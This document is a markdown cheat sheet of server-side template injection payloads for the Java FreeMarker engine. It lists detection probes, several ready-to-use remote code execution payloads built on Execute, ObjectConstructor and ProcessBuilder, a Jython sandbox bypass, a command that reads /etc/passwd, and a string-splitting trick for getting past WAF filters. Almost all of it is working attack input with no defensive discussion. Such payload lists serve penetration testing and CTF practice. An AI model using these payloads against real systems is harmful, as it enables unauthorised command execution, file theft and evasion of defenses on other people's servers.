# SSTI - Freemarker (Java)

## Detection
```
${7*7}           → 49
#{7*7}           → 49 (older syntax)
<#assign x=7*7>${x}
```

## RCE Payloads

### Execute Command (Freemarker.template.utility.Execute)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Using ObjectConstructor
```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
<#assign process=value("java.lang.ProcessBuilder", "id")>
${process.start()}
```

### Reading Output from ProcessBuilder
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign ec=owc?new()>
<#assign process=ec("java.lang.ProcessBuilder",["id"])>
${process.start()}
```

## Full RCE Payload (common CTF pattern)
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

```
<#assign classLoader=article.class.protectionDomain.classLoader>
<#assign owc=classLoader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign exec=owc?new()>
${exec("java.lang.ProcessBuilder", "calc.exe").start()}
```

## Sandbox Bypass (if class access restricted)
```
<#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("import os; os.system('id')")}
```

## File Read
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("cat /etc/passwd")}
```

## Context Object Access
```
${.data_model}                  # Available data model variables
${.globals}                     # Global variables
${.main}                        # Main namespace
${.now}                         # Current date/time
```

## Blocking/WAF Bypass
```
<#assign val="fr"+"eemarker.template.utility.Execute"?new()>${val("id")}
```

## Version Detection
```
${.version}
```
